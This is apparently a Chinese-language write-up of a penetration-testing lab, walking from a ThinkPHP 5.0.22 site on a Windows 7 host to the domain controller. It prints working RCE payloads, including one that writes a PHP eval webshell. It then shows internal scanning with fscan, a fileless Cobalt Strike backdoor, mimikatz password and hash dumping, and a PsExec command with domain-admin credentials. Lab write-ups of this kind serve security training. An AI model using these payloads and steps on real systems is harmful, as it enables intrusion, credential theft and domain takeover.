内网：192.168.138.136

在win7，c盘的phpstudy上把服务开起来

win2008

内网：192.168.138.138

攻击机

kali：192.168.135.166

资产探索

1、端口探测

nmap扫一下，发现开了几个端口

访问下80端口，好一个十年磨一剑，ThinkPHP的框架，这让我想起来高三慷慨激昂的励志文，贺舒婷的《你凭什么上北大》，“十年磨一剑，我得到的，几乎是块废铁“


可以查找下thinkphp的公开poc，来试一试，网上都有哈，ip后面输入/xxxx，会报错thinkphp的版本号，V5.0.22

5.0.x-5.0.23通杀RCE-payload

?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars1=whoami，发现有回显

把上面那个payload改一下

?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars1=powershell pwd

只有pwd执行后，是不会正确显示的，一定要加上powershell

拿shell

弄个简单的webshell马，名字叫12345.php，传上去，方便后面管理，密码：xiaolv

?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars1=12345.php&vars1=<?php @eval($_POST[xiaolv]); ?>

有回显，应该是传上去了，用蚁剑试试

连接成功

查看发现有135,138两张网卡，135为外网网卡

传上fscan，对着138的端扫一下，我这里的蚁剑可能是版本问题，不直接回显，就把fscan的结果输出到2.txt文件中

fscan.exe -h 192.168.138.1/24 -o 2.txt

192.168.135.1是我破本子的物理机地址，发现有一台138.138的地址，进一步颗粒度更细致的扫描

发现详细信息，只有一台138.138是一台win server 2008的DC，还有MS17_010的洞

横向移动

为了横向移动方便换cs，我这里是kali上的4.3版本

创建teamserver，设置端口和连接密码

设置监听器，监听端口80

做个马，选择attacks-web drive-by-scripted web delivery(s),无文件落地

这里选择我们之前选好的监听器kali,点击创建后，会在后门powershell命令，在蚁剑上执行

win7 192.168.138.136目标机器上线，用户为Administrator，下一步提权

提权成功

设置下心跳值sleep 0 ，迷糊桃抓一下密码

发现域信息 sun，域管理员账密

接下里的思路，两个不同的网段，不能直接连接，尝试CS派生smb beacon 让win server 2008连接win7，配合psexec来拿域控

在原会话上创建一个监听

取名为zhongzhuan，session选择的是已经拿到system权限，pid为3472的会话

生成一个后门马名为333.exe

然后把PsExec也传上去，官方地址https://learn.microsoft.com/zh-cn/sysinternals/downloads/psexec

把PsExec.exe和上面生成的333.exe通过上传上去

Shell C:\phpStudy\PHPTutorial\WWW\public\PsExec64.exe -accepteula \\192.168.138.138 -u sun\Administrator -p dc123.com -d -c C:\phpStudy\PHPTutorial\WWW\public\333.exe

使用cs插件提权成功

迷糊桃抓一下所有用户的hash，结束

后言

我这个cs好奇怪，监听器zhongzhuan监听333.exe的马，DC上线以后listener为什么还显示kali，接下来再好好研究下
